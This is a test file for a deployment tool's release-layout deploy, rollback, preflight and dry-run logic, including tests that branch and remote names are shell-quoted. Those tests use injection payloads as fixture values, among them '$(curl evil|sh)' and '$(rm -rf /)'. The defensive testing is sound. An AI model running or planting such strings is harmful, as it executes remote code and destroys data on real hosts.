    const probe = makeReleaseRuntime();
    // Fails ONLY the recovery's flip-back (source = st.prevTarget /
    // cfg.currentLink, destination = `current`) — NOT the forward path's
    // OWN two symlink writes, which share the same source (updating the
    // `previous` pointer, destination "previous") or destination (flipping
    // `current` to the NEW candidate, different source) but never both.
    const { runtime, calls } = makeReleaseRuntime({
      runningSha: 'deadbeefdeadbeef', // forces the forward activation verify to fail -> triggers recover()
      fail: [`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`],
    });

    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED/);

    // The recovery flip-back was actually attempted (and failed) — this
    // isn't vacuously passing because it never ran.
    expect(calls.some((cmd) => cmd.includes(`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`))).toBe(true);
    // DB-restore decision, pinned: writers were already confirmed stopped
    // before the flip-back was ever attempted, so the restore is still safe
    // and STILL runs even though the flip-back failed — leaving a migrated
    // DB paired with code that may revert to pre-migration is its own hazard,
    // and this is a data operation, not a traffic-affecting one.
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(true);
    // What must NOT happen: a SECOND `pm2 startOrRestart` -- the recovery's
    // own resume of the previous release. The FIRST one is the forward
    // path's own restart onto the candidate (before verification ever runs,
    // which is what triggers recovery in the first place) and legitimately
    // still happens; only the recovery-triggered one must be suppressed.
    expect(calls.filter((cmd) => cmd.includes('pm2 startOrRestart')).length).toBe(1);
  });

  it('escalates to MANUAL RECOVERY REQUIRED when a migration failed AND the restore also fails', () => {
    const { runtime } = makeReleaseRuntime({ fail: ['run-migrate', 'run-restore'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/MANUAL RECOVERY REQUIRED/);
  });

  it('preflight refuses a migrate hook with no backup or no restore hook', () => {
    const noBackup = relConfig({ hooks: { install: 'npm ci', build: 'npm run build', migrate: 'run-migrate', backup: null, restore: 'run-restore' } });
    expect(() => release.deployRelease(noBackup, {}, ctx(makeReleaseRuntime().runtime))).toThrow(/requires a .backup. hook/);
    const noRestore = relConfig({ hooks: { install: 'npm ci', build: 'npm run build', migrate: 'run-migrate', backup: 'run-backup', restore: null } });
    expect(() => release.deployRelease(noRestore, {}, ctx(makeReleaseRuntime().runtime))).toThrow(/requires a .restore. hook/);
  });
});

describe('release deploy — safety hardening (Codex review fixes)', () => {
  it('aborts if DB writers cannot be CONFIRMED stopped (never backs up over live writers)', () => {
    const { runtime, calls } = makeReleaseRuntime({ stopIneffective: true });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/could not confirm|Could not confirm/i);
    expect(calls.some((cmd) => cmd.includes('run-backup'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('run-migrate'))).toBe(false);
  });

  it('durably journals state (atomic write) before the atomic flip', () => {
    const rt = makeReleaseRuntime();
    release.deployRelease(relConfig(), {}, ctx(rt.runtime));
    const c = rt.calls;
    const firstStateWrite = c.findIndex((cmd) => /deploy-kit-state\.json\.tmp.*&& mv -f/.test(cmd));
    const flip = c.findIndex((cmd) => /mv -Tf .*\/current/.test(cmd));
    expect(firstStateWrite).toBeGreaterThanOrEqual(0);
    expect(firstStateWrite).toBeLessThan(flip);
  });

  it('rollback flips back to the original release when the target is unhealthy', () => {
    let verifyCwdCalls = 0;
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        // First activation-verify (the rollback target) sees a stale cwd → unhealthy;
        // the flip-back verify (original) sees a good cwd → healthy.
        if (cmd.includes('readlink -f /proc/')) {
          verifyCwdCalls += 1;
          return verifyCwdCalls <= 1 ? '/srv/app/releases/99999999cccc-20260101T000000Z' : rt.cfg.canonical;
        }
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    expect(() => release.rollbackRelease(relConfig(), {}, ctx(runtime))).toThrow(/restored the original release/);
  });

  it('refuses to start when a previous deploy was interrupted mid-disruptive-phase', () => {
    const { runtime, calls } = makeReleaseRuntime({ stateContent: '{"phase":"migrated","releaseId":"a1b2c3d4e5f6-20260710T010000Z","backupId":"backup-x"}' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/interrupted mid-"migrated"/);
    expect(calls.some((cmd) => cmd.includes('worktree add'))).toBe(false);
  });

  it('rejects a corrupt current pointer that tries to traverse out of releases/', () => {
    const { runtime } = makeReleaseRuntime({ currentLink: 'releases/..' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/not a safe releases\/<id> target/);
  });

  it('prune removes the oldest release beyond keepReleases, protecting current/previous', () => {
    const rt = makeReleaseRuntime({
      releasesList: '00000000aaaa-20260709T090000Z\n00000000bbbb-20260708T090000Z\n00000000cccc-20260707T090000Z\nnot-a-release-dir',
      currentLink: 'releases/00000000aaaa-20260709T090000Z',
      previousLink: 'releases/00000000bbbb-20260708T090000Z',
    });
    const cfg = relConfig({ layout: { type: 'releases', keepReleases: 2, sharedPaths: ['.env'], releaseChecks: [], runningShaCommand: 'get-running-sha' } });
    const noop = () => {};
    const pruneCtx = { runtime: rt.runtime, sleep: noop, log: { step: noop, warning: noop, success: noop, info: noop, error: noop, header: noop, divider: noop } };
    release.prune(cfg, release.releasePaths(cfg), '00000000aaaa-20260709T090000Z', pruneCtx);
    // oldest recognized (cccc) is removed; the unrecognized dir is left alone.
    expect(rt.calls.some((cmd) => cmd.includes('worktree remove --force /srv/app/releases/00000000cccc-20260707T090000Z'))).toBe(true);
    expect(rt.calls.some((cmd) => cmd.includes('not-a-release-dir'))).toBe(false);
    expect(rt.calls.some((cmd) => cmd.includes('worktree remove --force /srv/app/releases/00000000bbbb'))).toBe(false);
  });
});

describe('release deploy — flag honoring vs rejection under the release layout', () => {
  it('honors --skip-deps: no install command runs and "install" is absent from steps', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), { skipDeps: true }, ctx(runtime));
    expect(calls.some((cmd) => cmd.includes('npm ci'))).toBe(false);
    expect(result.steps).not.toContain('install');
    // the build step is unaffected by --skip-deps.
    expect(result.steps).toContain('build');
  });

  it('honors --skip-build: no build command runs and "build" is absent from steps', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), { skipBuild: true }, ctx(runtime));
    expect(calls.some((cmd) => cmd.includes('npm run build'))).toBe(false);
    expect(result.steps).not.toContain('build');
    // install is unaffected by --skip-build.
    expect(result.steps).toContain('install');
  });

  it('rejects --no-stash with a clear error naming the flag (no working-tree stash under this layout)', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.deployRelease(relConfig(), { stash: false }, ctx(runtime))).toThrow(/--no-stash does not apply/);
    // nothing was touched — the rejection happens before any target command runs.
    expect(calls.length).toBe(0);
  });

  it('rejects --skip-build for release-layout rollback (no rebuild step exists there)', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.rollbackRelease(relConfig(), { skipBuild: true }, ctx(runtime))).toThrow(/--skip-build does not apply/);
    expect(calls.length).toBe(0);
  });

  it('rejects --skip-deps for release-layout rollback (no install step exists there)', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.rollbackRelease(relConfig(), { skipDeps: true }, ctx(runtime))).toThrow(/--skip-deps does not apply/);
    expect(calls.length).toBe(0);
  });
});

describe('release deploy — default-branch resolution (Bug 2)', () => {
  it('with branch: null, resolves origin/HEAD instead of hardcoding master (repo whose default is main)', () => {
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        // The shared resolveBranch call, scoped to the bare mirror via --git-dir.
        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return 'origin/main';
        // The subsequent SHA resolution now looks up refs/heads/main, not master.
        if (cmd.includes("rev-parse refs/heads/'main'")) return SHA;
        if (cmd.includes("rev-parse refs/heads/'master'")) throw new Error('should not resolve refs/heads/master when the default branch is main');
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
    expect(result.branch).toBe('main');
    expect(result.sha).toBe(SHA);
    expect(result.steps).toContain('flip');
  });

  it('with branch: null and no resolvable origin/HEAD, falls back to master', () => {
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return ''; // unresolvable
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
    expect(result.branch).toBe('master');
  });
});

describe('PKG-82 Bug 6: release layout quotes branch/remote at the git call site (defense in depth)', () => {
  it('quotes a branch resolved from a hostile origin/HEAD (;, backticks, $(...)) so it cannot break out', () => {
    // The target's own `origin/HEAD` is attacker-influenceable (whoever can rename
    // the repo's default branch controls it) and git's check-ref-format permits
    // `;`, backticks, `$()` in a refname. resolveBranch (src/branch.js) resolves
    // this, and deployRelease interpolates it into `git rev-parse refs/heads/<branch>`
    // on the target — assert the emitted command shell-quotes it rather than
    // executing the injected command.
    const evilBranch = 'master; `curl evil|sh` $(rm -rf /)';
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        // The shared resolveBranch call, scoped to the bare mirror via --git-dir.
        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return `origin/${evilBranch}`;
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
    expect(result.branch).toBe(evilBranch);
    const joined = calls.join('\n');
    expect(joined).toContain(`rev-parse refs/heads/'${evilBranch}'`);
    // never present unquoted in a way that would let the shell run it.
    expect(joined).not.toContain(`rev-parse refs/heads/${evilBranch}`);
  });

  it('quotes a `$()` command-substitution branch name as an inert literal in the fallback origin/<branch> lookup', () => {
    // Force the primary `refs/heads/<branch>` lookup to fail (an invalid/non-hex
    // result) so deployRelease falls back to resolveSha(`${remote}/${branch}`) —
    // the second unquoted interpolation the ticket calls out.
    const evilBranch = '$(curl evil|sh)';
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        if (cmd.includes(`rev-parse refs/heads/'${evilBranch}'`)) return 'not-a-sha'; // fails the 40-hex check
        if (cmd.includes(`rev-parse 'origin'/'${evilBranch}'`)) return SHA;
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    const result = release.deployRelease(relConfig({ branch: evilBranch }), {}, ctx(runtime));
    expect(result.sha).toBe(SHA);
    const joined = calls.join('\n');
    expect(joined).toContain(`rev-parse 'origin'/'${evilBranch}'`);
    expect(joined).not.toContain(`rev-parse origin/${evilBranch}`);
  });

  it('escapes an embedded single quote in the branch so it cannot break out of the quoting', () => {
    const evilBranch = "master'; curl evil|sh #";
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    release.deployRelease(relConfig({ branch: evilBranch }), {}, ctx(runtime));
    const joined = calls.join('\n');
    expect(joined).toContain(`rev-parse refs/heads/'master'\\''; curl evil|sh #'`);
  });

  it('quotes config.remote in the bare-mirror fetch, even with shell metacharacters', () => {
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    release.deployRelease(relConfig({ remote: 'origin;curl evil|sh' }), {}, ctx(runtime));
    const joined = calls.join('\n');
    expect(joined).toContain(`fetch --prune 'origin;curl evil|sh' '+refs/heads/*:refs/heads/*'`);
    expect(joined).not.toContain('fetch --prune origin;curl evil|sh ');
  });
});

// PKG-127 defect 3: `--dry-run` used to read '' for every non-curl command, so
// even a genuinely migrated release-layout host's `.deploy-kit-layout` marker
// came back empty and preflight refused with "requires a migrated host" — the
// exact host the check exists to let through. preflight()'s reads are now
// marked `readOnly`, which (only under a runtime carrying `dryRun: true`, as
// cli.js's dry-run context now does) run for real instead of through the fake.
// This mirrors cli.js's dryRunContext() shape directly rather than going
// through the CLI, to keep the test at the same level as the rest of this file.
describe('release deploy — preflight is real under --dry-run (PKG-127)', () => {
  function dryRunCtx(realRuntime: any) {
    const dryCalls: string[] = [];
    const realCalls: string[] = [];
    const wrappedReal = (file: string, args: string[], opts: any) => {
      realCalls.push(args[args.length - 1]);
      return realRuntime.execFileSync(file, args, opts);
    };
    const runtime = {
      dryRun: true,
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        dryCalls.push(cmd);
        return /curl/.test(cmd) ? '200' : '';
      },
      realExecFileSync: wrappedReal,
    };
    return { ctx: { runtime, sleep: () => {} }, dryCalls, realCalls };
  }

  it('does not reject a genuinely migrated host — the marker read runs for real, not through the dry-run fake', () => {
    const { runtime } = makeReleaseRuntime(); // marker present on the "target"
    const { ctx, dryCalls, realCalls } = dryRunCtx(runtime);

    // The false-negative this defect caused: before the fix, this always threw
    // "requires a migrated host" even though the host really is migrated.
    expect(() => release.deployRelease(relConfig(), {}, ctx)).not.toThrow(/requires a migrated host/);
    expect(() => release.deployRelease(relConfig(), {}, ctx)).not.toThrow(/marker mismatch/);

    expect(realCalls.some((c) => c.includes('.deploy-kit-layout'))).toBe(true);
    expect(dryCalls.some((c) => c.includes('.deploy-kit-layout'))).toBe(false);
  });

  it('still refuses a host that is genuinely NOT migrated — readOnly reflects reality, it does not fake success', () => {
    const { runtime } = makeReleaseRuntime({ marker: '' }); // no marker on the "target"
    const { ctx } = dryRunCtx(runtime);
    expect(() => release.deployRelease(relConfig(), {}, ctx)).toThrow(/requires a migrated host/);
  });

  it('reaches real preflight-adjacent logic past the marker check (proves dispatch continued, not just "didn\'t throw")', () => {
    const { runtime } = makeReleaseRuntime();
    const { ctx } = dryRunCtx(runtime);
    // Past preflight, SHA resolution is NOT a readOnly probe (still simulated,
    // like the rest of a dry run) and legitimately fails against the all-empty
    // dry-run fake — proof execution actually got past preflight into the real
    // pipeline, the same "reached real logic, stopped at a later expected
    // boundary" shape cli-flags.test.ts already uses for legacy --dry-run.
    expect(() => release.deployRelease(relConfig(), {}, ctx)).toThrow(/Could not resolve/);
  });
});

describe('release deploy — preflight guards (each must fail by name)', () => {
  it('refuses a host with no layout marker', () => {
    const { runtime } = makeReleaseRuntime({ marker: '' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/requires a migrated host/);
  });
  it('refuses a marker with the wrong layout version', () => {
    const { runtime } = makeReleaseRuntime({ marker: '{"layout":"releases","version":99}' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/marker mismatch/);
  });
  it('refuses a target without GNU coreutils mv', () => {
    const { runtime } = makeReleaseRuntime({ mvVersion: 'mv (BusyBox v1.36)' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/GNU coreutils/);
  });
  it('refuses when free disk is below the threshold', () => {
    const { runtime } = makeReleaseRuntime({ dfAvail: '1024' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/Insufficient free disk/);
  });
  it('refuses release deploy without a stable ecosystemFile', () => {
    const { runtime } = makeReleaseRuntime();
    expect(() => release.deployRelease(relConfig({ ecosystemFile: null }), {}, ctx(runtime))).toThrow(/requires .ecosystemFile/);
  });
  it('refuses when the resolved SHA and the built SHA differ', () => {
    const { runtime } = makeReleaseRuntime({ builtSha: 'ffffffffffffffffffffffffffffffffffffffff' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/Candidate SHA/);
  });
  it('refuses a sharedPath that is tracked in the release', () => {
    const { runtime } = makeReleaseRuntime({ tracked: 'TRACKED' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/would hide a committed file/);
  });
});

describe('release rollback', () => {
  it('flips current back to the previous release with no reinstall/rebuild', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.rollbackRelease(relConfig(), {}, ctx(runtime));
    expect(result.release).toBe('releases/00000000bbbb-20260708T090000Z');
    expect(calls.some((cmd) => /mv -Tf .*\/current/.test(cmd))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('npm ci'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('npm run build'))).toBe(false);
  });
  it('refuses to roll back when no previous release is recorded', () => {
    const { runtime } = makeReleaseRuntime({ previousLink: '' });
    expect(() => release.rollbackRelease(relConfig(), {}, ctx(runtime))).toThrow(/No previous release/);
  });
});

describe('legacy path refuses a release-layout host', () => {
  it('aborts a legacy deploy when .deploy-kit-layout is present', () => {
    const calls: string[] = [];
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        if (cmd.includes('.deploy-kit-layout')) return 'RELEASE';
        if (cmd.includes('curl')) return '200';
        return '';
      },
    };
    const legacy = mergeConfig(DEFAULT_CONFIG, {
      host: 'app@pi', projectDir: '/srv/app', appNames: ['app'], dbBoundApps: ['app'], branch: 'master',
      hooks: { install: 'npm ci', migrate: 'run-migrate', build: 'npm run build' },
    });
    expect(() => kit.deploy(legacy, {}, ctx(runtime))).toThrow(/Refusing to run a legacy in-place deploy/);
    expect(calls.some((cmd) => cmd.includes('git pull'))).toBe(false);
  });
});
